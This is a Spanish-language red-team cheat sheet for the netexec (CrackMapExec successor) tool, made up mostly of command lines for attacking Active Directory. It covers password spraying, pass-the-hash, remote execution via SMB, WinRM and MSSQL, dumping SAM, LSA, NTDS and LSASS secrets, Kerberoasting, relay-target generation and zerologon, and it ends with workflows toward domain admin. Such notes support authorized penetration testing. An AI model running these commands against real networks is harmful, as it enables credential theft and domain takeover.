---
aliases:
  - nxc
  - CrackMapExec
  - CME
tags:
  - tool/netexec
  - technique/lateral-movement
  - technique/recon/active
  - env/windows
  - asset/active-directory
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
  - "[[Windows & Active Directory Movimiento Lateral]]"
kind: Tool
linked:
  - "[[Pass-the-Hash]]"
  - "[[Kerberoasting]]"
  - "[[AS-REP Roasting]]"
  - "[[DCSync]]"
  - "[[NTLM Relay]]"
  - "[[Responder]]"
  - "[[BloodHound & SharpHound]]"
  - "[[SMB (139, 445) - Enumeración]]"
  - "[[LDAP (389, 636, 3268, 3269) - Enumeración]]"
---
# netexec (nxc)

---

## Overview

Successor de **CrackMapExec** (CME). Swiss army knife para enum + lateral movement en AD. Protocolos: `smb`, `ldap`, `winrm`, `mssql`, `rdp`, `ssh`, `ftp`, `vnc`, `wmi`, `nfs`. Install: `pipx install git+https://github.com/Pennyw0rth/NetExec`.

> Regla: `nxc` reemplaza `crackmapexec`. Legacy CME no se mantiene desde 2023.

---

## Sintaxis base

```bash
nxc <protocol> <target> -u <user> -p <pass|hash> [opciones]
```

- `target` acepta: IP única, CIDR (`10.10.10.0/24`), rango, archivo (`targets.txt`).
- Creds: `-u user -p 'pass'` / `-H <NThash>` / `-k` (Kerberos ccache) / `-a <hash>` (aes).
- Null session: `-u '' -p ''` / Guest: `-u guest -p ''`.
- Local auth: `--local-auth`.

---

## Protocolo SMB

### Enum básica

```bash
# Host discovery + banner + firma + SMBv1
nxc smb 10.10.10.0/24

# Validar creds masivo (spray)
nxc smb targets.txt -u users.txt -p 'Summer2024!' --continue-on-success

# Null session
nxc smb 10.10.10.10 -u '' -p ''
```

### Post-auth enum

```bash
nxc smb <t> -u u -p p --shares               # listar shares + permisos R/W
nxc smb <t> -u u -p p --sessions             # sesiones activas
nxc smb <t> -u u -p p --loggedon-users       # users logueados
nxc smb <t> -u u -p p --users                # enum de usuarios del dominio
nxc smb <t> -u u -p p --groups               # grupos
nxc smb <t> -u u -p p --pass-pol             # password policy
nxc smb <t> -u u -p p --rid-brute 10000      # RID bruteforce
nxc smb <t> -u u -p p --disks                # discos
nxc smb <t> -u u -p p --computers            # computadoras del dominio
nxc smb <t> -u u -p p --local-groups         # grupos locales
nxc smb <t> -u u -p p -M spider_plus         # spider shares buscando loot
```

### Password spraying

```bash
# Un password contra muchos users
nxc smb <dc> -u users.txt -p 'Winter2024!' --continue-on-success

# Respetar lockout: check policy primero
nxc smb <dc> -u '' -p '' --pass-pol
```

### Ejecución

```bash
nxc smb <t> -u u -p p -x 'whoami'                        # cmd.exe (wmiexec)
nxc smb <t> -u u -p p -X 'whoami'                        # PowerShell
nxc smb <t> -u u -p p --exec-method smbexec -x 'cmd'     # smbexec / atexec / wmiexec / mmcexec
nxc smb <t> -u u -p p -M rdp -o ACTION=enable            # habilitar RDP
```

### Dumps de creds

```bash
nxc smb <t> -u u -p p --sam                    # local SAM (admin)
nxc smb <t> -u u -p p --lsa                    # LSA secrets
nxc smb <t> -u u -p p --ntds                   # NTDS.dit (DC + DA)
nxc smb <t> -u u -p p --ntds --users           # filtra solo users
nxc smb <t> -u u -p p --dpapi                  # DPAPI masterkeys
nxc smb <t> -u u -p p --lsa --local-auth       # local admin
```

Ver [[DCSync]] para NTDS sin pisar DC.

### PtH

```bash
nxc smb <t> -u Administrator -H <NThash> --local-auth
nxc smb <t> -u svc -H <NThash> -d <domain>
```

Matriz completa: [[Pass-the-Hash]].

### Generar relay list

```bash
# Listar hosts sin SMB signing (target para NTLM Relay)
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
```

Input directo para `ntlmrelayx -tf relay_targets.txt`.

---

## Protocolo LDAP

```bash
nxc ldap <dc> -u u -p p --users                # enum users
nxc ldap <dc> -u u -p p --groups               # grupos
nxc ldap <dc> -u u -p p --asreproast hashes    # AS-REP Roast + output
nxc ldap <dc> -u u -p p --kerberoasting h.txt  # SPN roast
nxc ldap <dc> -u u -p p --trusted-for-delegation
nxc ldap <dc> -u u -p p --password-not-required
nxc ldap <dc> -u u -p p --admin-count          # miembros de grupos protegidos
nxc ldap <dc> -u u -p p --dnsdump              # DNS records del dominio
nxc ldap <dc> -u u -p p --find-delegation      # unconstrained/constrained/RBCD
nxc ldap <dc> -u u -p p -M get-desc-users      # descriptions (creds en comments)
nxc ldap <dc> -u u -p p -M laps                # leer LAPS passwords si permisos
nxc ldap <dc> -u u -p p -M maq                 # MachineAccountQuota
nxc ldap <dc> -u u -p p -M adcs                # enum ADCS templates
nxc ldap <dc> -u u -p p -M gpp-password        # cPassword en GPP (MS14-025)
```

Query custom:

```bash
nxc ldap <dc> -u u -p p --query "(objectclass=user)" ""
```

---

## Protocolo WinRM

```bash
# Check si user tiene WinRM (grupo Remote Management Users)
nxc winrm <t> -u u -p p

# Exec
nxc winrm <t> -u u -p p -x 'whoami /all'
nxc winrm <t> -u u -p p -X '$PSVersionTable'
```

Si `Pwn3d!` → `evil-winrm -i <t> -u u -p p`.

---

## Protocolo MSSQL

```bash
nxc mssql <t> -u sa -p 'Summer2024!'                    # validate
nxc mssql <t> -u sa -p p --local-auth
nxc mssql <t> -u u -p p -q 'SELECT @@version'
nxc mssql <t> -u sa -p p -x 'whoami'                    # xp_cmdshell
nxc mssql <t> -u sa -p p -X 'whoami'                    # PowerShell
nxc mssql <t> -u u -p p -M mssql_priv                   # enum privilegios / impersonation chains
```

Windows auth + PtH:

```bash
nxc mssql <t> -u Admin -H <hash> -d <domain> -q 'EXEC sp_linkedservers'
```

---

## Protocolo RDP

```bash
nxc rdp <t> -u u -p p                 # validate
nxc rdp <t> -u u -p p --screenshot    # screenshot del login (NLA off)
nxc rdp <t> -u u -p p --nla-screenshot
```

---

## Protocolo SSH

```bash
nxc ssh targets.txt -u users.txt -p passwords.txt --continue-on-success
nxc ssh <t> -u u -i id_rsa            # key
nxc ssh <t> -u u -p p -x 'id'
```

---

## Otros protocolos

```bash
nxc ftp <t> -u anonymous -p ''
nxc vnc <t> -p 'Password1'            # VNC sin user
nxc wmi <t> -u u -p p -x 'whoami'
nxc nfs <t>                           # enum mounts + ver si no_root_squash
```

---

## Módulos (`-M`)

```bash
nxc smb -L                    # listar módulos
nxc smb -M <module> --options # ver opciones
nxc smb <t> -u u -p p -M <module> -o KEY=val
```

**Módulos high-value:**

| Módulo | Protocolo | Descripción |
|---|---|---|
| `spider_plus` | smb | Recorre shares buscando ficheros sensibles |
| `laps` | ldap | Lee `ms-Mcs-AdmPwd` si ACL |
| `adcs` | ldap | Lista templates ADCS |
| `gpp-password` | ldap | cPassword en SYSVOL (MS14-025) |
| `get-desc-users` | ldap | Descriptions de users (passwords típicos) |
| `maq` | ldap | MachineAccountQuota (Shadow Creds / RBCD) |
| `add-computer` | ldap | Crear computer account (RBCD) |
| `lsassy` | smb | Dump LSASS remoto + parse |
| `masky` | smb | Robar cert via Certipy Kerberos |
| `nanodump` | smb | Dump LSASS stealth |
| `procdump` | smb | Dump LSASS via procdump |
| `ntdsutil` | smb | NTDS via ntdsutil snapshot |
| `wireless` | smb | Extraer creds wifi |
| `rdcman` | smb | Parse `.rdg` files |
| `keepass_discover` | smb | Encuentra .kdbx |
| `scuffy` | smb | `.scf` en shares para coerce auth |
| `petitpotam` | smb | Trigger coerce (ver [[Authentication Coercion]]) |
| `printerbug` | smb | RPC print trigger |
| `zerologon` | smb | CVE-2020-1472 |
| `pso` | ldap | Password Settings Objects |

---

## Kerberos

```bash
# Usar ccache
export KRB5CCNAME=user.ccache
nxc smb <t> -k -u user

# Con AES key
nxc smb <t> -u u -a <aeskey> -d domain.local --use-kcache
```

---

## Logging / opsec

```bash
nxc smb <t> -u u -p p --log out.log             # log a file
nxc smb <t> -u u -p p -o ...                    # opciones módulo
nxc smb -V                                      # debug
```

DB interna: `~/.nxc/nxc.db` (sqlite). Ver con `nxcdb`:

```bash
nxcdb
> workspace list
> workspace use default
> creds
> hosts
```

---

## Workflows típicos

### Post-compromiso inicial (user low-priv)

```bash
nxc smb <dc> -u $U -p $P --users --groups --shares
nxc smb <dc> -u $U -p $P --pass-pol
nxc ldap <dc> -u $U -p $P --kerberoasting k.txt
nxc ldap <dc> -u $U -p $P --asreproast a.txt
nxc ldap <dc> -u $U -p $P -M gpp-password -M adcs -M get-desc-users
nxc smb <range> -u $U -p $P --shares --continue-on-success  # shares con R/W
```

### Tras cracking → Pwn3d!

```bash
# Verificar admin en hosts
nxc smb <range> -u $U -H <hash> --continue-on-success | grep Pwn3d

# Dump creds en cada admin
nxc smb <pwn_list> -u $U -H <hash> --sam --lsa --dpapi
nxc smb <pwn_list> -u $U -H <hash> -M lsassy
```

### Hallar path a DA (chain con [[BloodHound & SharpHound]])

```bash
# SharpHound via netexec
nxc smb <dc> -u $U -p $P -M bloodhound -o COLLECTIONMETHOD=All
```

---

## Referencias

- Docs: https://www.netexec.wiki/
- Módulos: https://www.netexec.wiki/smb-protocol/modules
- Wiki protocolo SMB: https://www.netexec.wiki/smb-protocol
